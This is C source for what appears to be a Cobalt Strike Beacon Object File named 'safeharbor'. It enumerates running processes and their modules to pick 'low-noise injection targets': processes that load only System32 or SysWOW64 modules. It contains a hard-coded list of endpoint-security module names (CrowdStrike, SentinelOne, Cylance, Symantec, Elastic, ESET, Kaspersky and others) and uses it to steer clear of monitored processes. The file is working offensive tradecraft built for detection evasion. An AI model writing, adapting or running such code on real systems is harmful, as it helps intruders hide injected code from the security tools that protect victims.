/*
 * safeharbor - candidate low-noise injection targets (System32-only modules).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static int suspicious(const char *m)
{
    static const char *bad[] = {
        "csagent", "csfalcon", "sentinel", "cylance", "cb",
        "mfe", "symantec", "tmccsf", "elastic", "cortex",
        "xagt", "qualys", "savservice", "ekrn", "avp", "wd"
    };
    int i;
    for (i = 0; i < (int)(sizeof(bad) / sizeof(bad[0])); i++)
        if (bof_strstr(m, bad[i])) return 1;
    return 0;
}

void go(char *args, int alen)
{
    HANDLE psnap, msnap;
    PROCESSENTRY32 pe;
    MODULEENTRY32 me;
    int hits = 0;

    (void)args; (void)alen;

    psnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (psnap == INVALID_HANDLE_VALUE) return;

    BeaconPrintf(CALLBACK_OUTPUT, "Low-noise process candidates\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  %-6s %-32s %s\n", "PID", "Image", "Modules");

    bof_memzero(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (KERNEL32$Process32First(psnap, &pe)) {
        do {
            int mods = 0, clean = 1;
            msnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                                                       pe.th32ProcessID);
            if (msnap == INVALID_HANDLE_VALUE) continue;

            bof_memzero(&me, sizeof(me));
            me.dwSize = sizeof(me);
            if (KERNEL32$Module32First(msnap, &me)) {
                do {
                    mods++;
                    if (!bof_strstr(me.szExePath, "\\Windows\\System32\\") &&
                        !bof_strstr(me.szExePath, "\\Windows\\SysWOW64\\"))
                        clean = 0;
                    if (suspicious(me.szModule)) clean = 0;
                } while (KERNEL32$Module32Next(msnap, &me));
            }
            KERNEL32$CloseHandle(msnap);

            if (clean && mods > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "  %-6lu %-32s %d\n",
                             (unsigned long)pe.th32ProcessID, pe.szExeFile, mods);
                hits++;
            }
        } while (KERNEL32$Process32Next(psnap, &pe));
    }
    KERNEL32$CloseHandle(psnap);
    BeaconPrintf(CALLBACK_OUTPUT, "\nCandidates: %d\n", hits);
}
